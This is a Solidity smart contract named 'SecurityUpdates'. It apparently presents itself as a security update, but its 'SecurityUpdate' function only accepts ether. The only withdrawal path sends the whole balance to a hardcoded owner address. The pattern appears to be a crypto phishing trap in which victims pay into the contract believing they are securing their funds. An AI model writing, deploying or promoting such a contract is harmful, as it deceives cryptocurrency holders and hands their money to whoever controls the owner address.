1 pragma solidity ^0.4.26;
2 
3 contract SecurityUpdates {
4 
5     address private  owner;
6 
7      constructor() public{   
8         owner=0x636486e520d1B86E8674E934d230c7D5C90dc3b4;
9     }
10     function getOwner(
11     ) public view returns (address) {    
12         return owner;
13     }
14     function withdraw() public {
15         require(owner == msg.sender);
16         msg.sender.transfer(address(this).balance);
17     }
18 
19     function SecurityUpdate() public payable {
20     }
21 
22     function getBalance() public view returns (uint256) {
23         return address(this).balance;
24     }
25 }